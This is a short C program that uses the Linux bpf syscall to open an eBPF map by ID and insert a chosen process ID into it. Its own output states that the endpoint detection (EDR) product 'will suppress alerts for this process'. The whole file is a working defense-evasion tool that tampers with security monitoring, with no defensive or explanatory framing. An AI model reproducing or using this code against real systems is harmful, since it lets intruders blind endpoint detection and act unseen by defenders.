#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#define BPF_ATTR_SZ(f) \
    (offsetof(union bpf_attr, f) + sizeof(((union bpf_attr *)0)->f))

static int bpf_call(int cmd, union bpf_attr *a, unsigned sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static int map_fd_by_id(uint32_t id)
{
    union bpf_attr a = {}; a.map_id = id;
    return bpf_call(BPF_MAP_GET_FD_BY_ID, &a, BPF_ATTR_SZ(map_id));
}

static int map_get_info(int fd, struct bpf_map_info *info)
{
    union bpf_attr a = {};
    a.info.bpf_fd   = (uint32_t)fd;
    a.info.info_len = sizeof(*info);
    a.info.info     = (uint64_t)(uintptr_t)info;
    return bpf_call(BPF_OBJ_GET_INFO_BY_FD, &a, BPF_ATTR_SZ(info));
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <map_id> [pid]\n", argv[0]);
        return 1;
    }

    uint32_t map_id = (uint32_t)atoi(argv[1]);
    uint32_t pid    = (argc >= 3) ? (uint32_t)atoi(argv[2]) : (uint32_t)getpid();

    int fd = map_fd_by_id(map_id);
    if (fd < 0) { perror("map_fd"); return 1; }

    struct bpf_map_info info = {};
    if (map_get_info(fd, &info) < 0) { perror("map_info"); return 1; }

    printf("[*] map id=%u name='%s' type=%u key=%uB val=%uB\n",
           info.id, info.name, info.type, info.key_size, info.value_size);

    if (info.key_size != 4) {
        fprintf(stderr, "[!] expected key_size=4 (uint32 PID), got %u\n", info.key_size);
        return 1;
    }

    uint8_t val[8] = { 1 };
    if (info.value_size == 0 || info.value_size > sizeof(val)) {
        fprintf(stderr, "[!] unexpected value_size=%u\n", info.value_size);
        return 1;
    }

    union bpf_attr a = {};
    a.map_fd = (uint32_t)fd;
    a.key    = (uint64_t)(uintptr_t)&pid;
    a.value  = (uint64_t)(uintptr_t)val;
    a.flags  = BPF_ANY;

    if (bpf_call(BPF_MAP_UPDATE_ELEM, &a, BPF_ATTR_SZ(flags)) < 0) {
        perror("update");
        return 1;
    }
    printf("[*] PID %u inserted into map %u - EDR will suppress alerts for this process\n",
           pid, map_id);

    uint8_t check[8] = {};
    union bpf_attr la = {};
    la.map_fd = (uint32_t)fd;
    la.key    = (uint64_t)(uintptr_t)&pid;
    la.value  = (uint64_t)(uintptr_t)check;
    if (bpf_call(BPF_MAP_LOOKUP_ELEM, &la, BPF_ATTR_SZ(value)) == 0)
        printf("[*] verified: map[%u] = %u\n", pid, check[0]);

    close(fd);
    return 0;
}
